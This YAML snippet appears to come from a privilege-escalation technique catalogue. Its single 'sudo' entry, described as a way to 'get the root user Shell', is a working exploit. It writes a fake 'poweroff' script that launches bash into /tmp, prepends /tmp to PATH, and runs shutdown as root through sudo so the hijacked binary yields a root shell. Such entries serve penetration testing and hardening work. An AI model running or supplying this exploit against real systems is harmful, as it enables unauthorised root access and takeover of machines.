---
functions:
  sudo:
    - description: This can help us get the root user Shell
    - code: |
        echo /bin/bash > /tmp/poweroff
        chmod +x /tmp/poweroff
        export PATH=/tmp:$PATH
        sudo -u root /usr/sbin/shutdown
---
